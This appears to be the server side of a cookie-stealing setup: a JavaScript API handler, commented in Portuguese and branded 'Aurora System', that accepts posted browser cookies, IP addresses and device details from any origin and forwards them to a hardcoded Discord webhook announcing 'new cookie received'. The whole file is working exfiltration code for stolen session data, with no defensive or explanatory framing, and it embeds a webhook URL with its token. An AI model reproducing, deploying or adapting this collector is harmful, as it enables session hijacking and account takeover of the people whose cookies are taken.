export default async function handler(req, res) {
  // Configurar CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Log da requisição
  console.log('=== NOVA REQUISIÇÃO ===');
  console.log('Método:', req.method);
  console.log('URL:', req.url);

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // GET - testar se API está online
  if (req.method === 'GET') {
    return res.status(200).json({ 
      status: 'API funcionando!',
      message: 'Conectado com sucesso',
      timestamp: new Date().toISOString()
    });
  }

  // Apenas POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método não permitido' });
  }

  try {
    // Log do body recebido
    console.log('Body recebido:', req.body);
    
    const { cookie, ip, device, timestamp } = req.body;

    // Validações
    if (!cookie) {
      console.log('Erro: Cookie não fornecido');
      return res.status(400).json({ error: 'Cookie não fornecido' });
    }

    if (!ip) {
      console.log('Erro: IP não fornecido');
      return res.status(400).json({ error: 'IP não fornecido' });
    }

    console.log('Cookie:', cookie.substring(0, 50) + '...');
    console.log('IP:', ip);
    console.log('Device:', device);

    // Validar cookie
    if (cookie.length < 50) {
      console.log('Erro: Cookie muito curto');
      return res.status(400).json({ error: 'Cookie inválido - muito curto' });
    }

    // WEBHOOK DO DISCORD
    const webhookURL = 'https://canary.discord.com/api/webhooks/1477057706568323195/4545g7HNyqcjMCkJe2t95-djEoA-kuXgu-VY1u_zb6slpT3lpdmbwyxDl8urWU51Effi';

    console.log('Enviando para Discord...');

    const embed = {
      content: '@everyone ✦ **NOVO COOKIE RECEBIDO**',
      embeds: [{
        title: '🍪 Cookie Recebido',
        color: 0x6366f1,
        fields: [
          { name: '📝 Cookie', value: '```' + cookie + '```' },
          { name: '🌐 IP Address', value: '```' + ip + '```', inline: true },
          { name: '📱 Dispositivo', value: '```' + device + '```', inline: true },
          { name: '⏰ Horário', value: timestamp || new Date().toLocaleString('pt-BR'), inline: true }
        ],
        footer: { text: 'Aurora System • Vercel' },
        timestamp: new Date().toISOString()
      }]
    };

    // Enviar para o Discord
    const discordResponse = await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });

    console.log('Resposta do Discord:', discordResponse.status);

    if (!discordResponse.ok) {
      const errorText = await discordResponse.text();
      console.error('Erro Discord:', errorText);
      return res.status(500).json({ 
        error: 'Erro ao enviar para Discord',
        details: `Status: ${discordResponse.status}`
      });
    }

    // Sucesso!
    console.log('✅ Cookie enviado com sucesso!');
    return res.status(200).json({ 
      success: true,
      message: 'Cookie enviado com sucesso'
    });
    
  } catch (error) {
    console.error('❌ Erro na API:', error);
    return res.status(500).json({ 
      error: 'Erro interno no servidor',
      details: error.message 
    });
  }
}